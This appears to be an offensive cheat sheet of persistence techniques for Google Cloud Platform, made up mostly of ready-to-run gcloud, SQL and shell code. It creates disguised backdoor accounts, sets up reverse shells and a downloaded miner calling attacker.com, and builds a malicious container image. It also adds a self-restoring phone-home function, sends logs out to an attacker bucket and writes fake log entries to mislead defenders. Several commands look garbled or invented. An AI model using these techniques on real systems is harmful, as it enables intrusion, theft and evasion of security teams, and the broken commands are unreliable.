# GCP Persistence

Techniques for maintaining access to Google Cloud Platform environments.

## Service Account Backdoors

### Create Additional Service Account

```bash
# Create service account that won't be immediately noticed
gcloud iam service-accounts create backup-sync \
  --display-name="Backup Synchronization Service" \
  --project={projectId}

# Grant it sufficient permissions
gcloud projects add-iam-policy-binding {projectId} \
  --member=serviceAccount:backup-sync@{projectId}.iam.gserviceaccount.com \
  --role=roles/editor

# Generate key for later access
gcloud iam service-accounts keys create ~/backup-sync-key.json \
  --iam-account=backup-sync@{projectId}.iam.gserviceaccount.com

# Store key securely outside GCP
# This account persists even if original compromise is discovered
```

### Backdoor via Service Account Secret

```bash
# Store service account key in Secret Manager
# Even if key file is deleted, it's recoverable

gcloud secrets create service-account-backup \
  --data-file=backup-sync-key.json \
  --project={projectId}

# Grant yourself access to the secret
gcloud secrets add-iam-policy-binding service-account-backup \
  --member=user:{attacker@example.com} \
  --role=roles/secretmanager.secretAccessor

# Or use current service account
gcloud secrets add-iam-policy-binding service-account-backup \
  --member=serviceAccount:{currentSA}@{projectId}.iam.gserviceaccount.com \
  --role=roles/secretmanager.secretAccessor

# Retrieve later
gcloud secrets versions access latest --secret=service-account-backup
```

## User Account Persistence

### Create Hidden GCP User

```bash
# If you have appropriate organization permissions
# Create user account without obvious naming

gcloud identity-aware-proxy-admin create-identity-aware-proxy-account \
  --email=backup.manager@{domain} \
  --password={strongPassword}

# Add user to organization
gcloud identity create user \
  --given-name=Backup \
  --family-name=Manager\
  --primary-email=backup.manager@{domain}

# Grant high permissions
gcloud organizations add-iam-policy-binding {organization-id} \
  --member=user:backup.manager@{domain} \
  --role=roles/editor

# Account appears legitimate, blends in with organizational users
```

### Service Account to User Account

```bash
# Service account can trigger automated user creation
# Via Cloud Functions or Pub/Sub messages

# Create Cloud Function that creates users
cat > main.py << 'EOF'
import functions_framework
from google.cloud import identities_v1beta1

@functions_framework.cloud_event
def create_user(cloud_event):
    admin_client = identities_v1beta1.AdminServiceClient()
    
    request = identities_v1beta1.CreateUserRequest(
        user=identities_v1beta1.User(
            given_name='Backup',
            family_name='Admin',
            primary_email='backup.admin@company.com'
        )
    )
    
    user = admin_client.create_user(request=request)
    print(f'Created user: {user.name}')
EOF

# Deploy function
gcloud functions deploy create_user \
  --runtime python39 \
  --trigger-topic user-creation \
  --project={projectId}

# Trigger function to create backdoor user
gcloud pubsub topics publish user-creation --message='create'
```

## API Key Persistence

### Generate Service Account API Keys

```bash
# API keys are less monitored than OAuth tokens
# Perfect for long-term access

gcloud services api-keys create \
  --api-target=compute.googleapis.com \
  --display-name="Compute API Access" \
  --project={projectId}

# Keys are rotated less frequently than service account tokens
# Suitable for persistent access

# Export the key
gcloud services api-keys list --filter="displayName:Compute API Access"
gcloud services api-keys list --format="json" | jq '.[] | select(.displayName=="Compute API Access")'

# Use API key for requests
curl -X POST "https://compute.googleapis.com/compute/v1/projects/{projectId}/zones/us-central1-a/instances" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: {API_KEY}" \
  -d @instance-config.json
```

## Compute Persistence

### Startup Script Persistence

```bash
# Modify startup script on existing instances
gcloud compute instances add-metadata {instance} \
  --zone={zone} \
  --metadata-from-file startup-script=persistent-script.sh \
  --overwrite

# In persistent-script.sh
#!/bin/bash

# Run at boot, with root privileges on Linux instances

# Connect back to attacker infrastructure
(while true; do
  bash -i >& /dev/tcp/attacker.com/4444 0>&1
  sleep 60
done) &

# Install cryptocurrency miner
wget http://attacker.com/miner -O /tmp/m
chmod +x /tmp/m
/tmp/m &

# Create backdoor user
useradd -m -G sudo attacker
echo "attacker:password" | chpasswd

# Stop after changes
exit 0
```

### Scheduled Task via Cloud Scheduler

```bash
# Cloud Scheduler can trigger Cloud Functions on schedule
# Perfect for periodic persistence checks

gcloud scheduler jobs create pubsub persistence-check \
  --location=us-central1 \
  --schedule="0 */4 * * *" \
  --tz=America/Los_Angeles \
  --topic=persistence-check \
  --message-body='{"action": "verify_access"}'

# Cloud Function triggered by scheduler
cat > scheduler_handler.py << 'EOF'
import functions_framework
import requests

@functions_framework.cloud_event
def check_persistence(cloud_event):
    # Verify backdoor service account still exists
    # Recreate if deleted
    
    import google.auth
    from google.cloud import iam_admin_v1
    
    _, project = google.auth.default()
    
    client = iam_admin_v1.IAMClient()
    
    # Check if backdoor SA exists
    try:
        sa = client.get_service_account(
            request={"name": f"projects/-/serviceAccounts/backdoor@{project}.iam.gserviceaccount.com"}
        )
    except:
        # Recreate backdoor if deleted
        create_backdoor_sa(client, project)
    
    # Phone home
    requests.post('http://attacker.com/callback', json={
        'timestamp': str(datetime.now()),
        'status': 'alive'
    })
EOF
```

## Database User Persistence

### Create Backdoor Database User

```bash
# Create additional Cloud SQL user
gcloud sql users create backdoor \
  --instance={instance} \
  --password='Complex!Password#2024'

# Grant admin privileges
gcloud sql connect {instance} --user=root

# In SQL shell
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

# Even if original compromise vector is fixed
# Database user persists
mysql -h {instance-ip} -u backdoor -p'Complex!Password#2024'
```

### Stored Procedure Backdoor

```bash
# Create stored procedure that creates backdoor access
# Runs automatically when triggered

gcloud sql connect {instance} --user=root

# Create backdoor stored procedure
CREATE PROCEDURE `maintain_access`()
BEGIN
  # Create hidden user if doesn't exist
  CREATE USER IF NOT EXISTS 'hidden'@'%' IDENTIFIED BY 'SecurePass!123';
  GRANT ALL ON *.* TO 'hidden'@'%' WITH GRANT OPTION;
  
  # Log access
  INSERT INTO logs.access_log VALUES (NOW(), 'hidden', 'connected');
END;

# Trigger on database events or schedule
CREATE TRIGGER after_user_login
AFTER LOGON ON DATABASE
FOR EACH STATEMENT
CALL maintain_access();
```

## Cloud Storage Persistence

### Malicious Container Image in Artifact Registry

```bash
# Container images are persistent and automatically pulled
# Perfect for long-term code execution

# Create malicious container
cat > Dockerfile << 'EOF'
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y curl bash

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

ENTRYPOINT ["/entrypoint.sh"]
EOF

cat > entrypoint.sh << 'EOF'
#!/bin/bash

# Reverse shell to attacker
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Or if that fails, periodic callback
while true; do
  curl -X POST http://attacker.com/checkin \
    -d "hostname=$(hostname)&status=running"
  sleep 300
done
EOF

# Build and push
docker build -t us-central1-docker.pkg.dev/{project}/containers/app:v1 .
docker push us-central1-docker.pkg.dev/{project}/containers/app:v1

# Next deployment uses malicious image
# Image persists in registry even if original container deleted
```

### Cloud Storage Permissions Backdoor

```bash
# Grant yourself permanent access to Cloud Storage
# Create synthetic user or service account with permissions

gsutil iam get gs://{sensitive-bucket} > bucket-policy.json

# Add attacker's service account
# bucket-policy.json
{
  "bindings": [
    {
      "role": "roles/storage.admin",
      "members": [
        "serviceAccount:attacker@attacker-project.iam.gserviceaccount.com"
      ]
    }
  ]
}

gsutil iam set bucket-policy.json gs://{sensitive-bucket}

# Now attacker can access bucket from their own project
gcloud auth activate-service-account --key-file=attacker-key.json
gsutil ls gs://{sensitive-bucket}  # Works from attacker's project
```

## Monitoring & Logging Backdoors

### Cloud Logging Export to External Bucket

```bash
# Configure log export to attacker-controlled bucket
gcloud logging sinks create attacker-log-export \
  gs://attacker-logs/ \
  --log-filter='resource.type="gce_instance"' \
  --project={projectId}

# Or if you control a bucket in the same project
gcloud logging sinks create internal-export \
  gs://internal-logs-{projectId}/ \
  --log-filter='*' \
  --project={projectId}

# All logs exported automatically
# Includes activity logs useful for detecting other compromises
```

### Suppress Security Alerts

```bash
# If you have logging.logEntries.create permission
# You can create false logs to cover tracks

# Create log entry indicating normal activity
gcloud logging write normal-activity \
  'User login from 10.0.0.1' \
  --severity=INFO \
  --project={projectId}

# Create metrics and dashboards based on fake data
# Security team sees normal activity
```

## Custom Role Persistence

### Create Custom Role with Persistence Permissions

```bash
# Create custom role that looks innocuous but grants powerful permissions
cat > custom-role.yaml << 'EOF'
title: "Compliance Monitor"
description: "Monitors compliance and performs remediation"
includedPermissions:
  - compute.instances.get
  - compute.instances.list
  - iam.serviceAccounts.get
  - iam.serviceAccounts.create
  - iam.serviceAccounts.actAs
  - resourcemanager.projects.get
  - resourcemanager.projects.setIamPolicy
EOF

gcloud iam roles create customCompliance \
  --project={projectId} \
  --file=custom-role.yaml

# Assign role to your persistence accounts
gcloud projects add-iam-policy-binding {projectId} \
  --member=serviceAccount:backdoor@{projectId}.iam.gserviceaccount.com \
  --role=projects/{projectId}/roles/customCompliance

# Role persists as legitimate, business-critical function
```

## Organization Policy Exceptions

### Create Policy Exception for Persistence

```bash
# Organization policies can have exceptions
# Create exception for your persistence infrastructure

gcloud resource-manager org-policies set-policy \
  --project={projectId} \
  exceptions-policy.yaml

# In exceptions-policy.yaml
constraints: compute.requireShieldedVm
listPolicy:
  deniedValues:
    - compute.requireShieldedVmDisabled
exceptions:
  - exceptionPolicySelectorExpression: 'resource.name == "attacker-vm"'

# Now your backdoor VMs are exempt from security policies
# Can be unshielded, unmonitored, etc.
```

## Evidence Persistence

### Store Backdoor Keys in Secret Manager

```bash
# Multiple redundant copies of backdoor credentials
gcloud secrets create ssh-key-backup \
  --data-file=attacker-id_rsa \
  --project={projectId}

gcloud secrets create api-key-backup \
  --data-file=api-key.txt \
  --project={projectId}

gcloud secrets create service-account-json \
  --data-file=backdoor-sa.json \
  --project={projectId}

# Grant access to multiple service accounts
# If one is revoked, others still access secrets

gcloud secrets add-iam-policy-binding ssh-key-backup \
  --member=serviceAccount:sa1@{projectId}.iam.gserviceaccount.com \
  --role=roles/secretmanager.secretAccessor

gcloud secrets add-iam-policy-binding ssh-key-backup \
  --member=serviceAccount:sa2@{projectId}.iam.gserviceaccount.com \
  --role=roles/secretmanager.secretAccessor

# Multiple access paths ensure persistence
```

## Cross-Project Persistence

### Create Persistence in Different Project

```bash
# If you have cross-project access
# Create backdoor in less-monitored project

# List projects where you have access
gcloud projects list

# Switch to secondary project
gcloud config set project {secondary-project}

# Create backdoor infrastructure there
gcloud iam service-accounts create persistence-sa \
  --display-name="System Maintenance" \
  --project={secondary-project}

# Grant cross-project access back to primary
gcloud projects add-iam-policy-binding {primary-project} \
  --member=serviceAccount:persistence-sa@{secondary-project}.iam.gserviceaccount.com \
  --role=roles/editor

# Even if primary project is cleaned up
# Secondary project maintains access
```
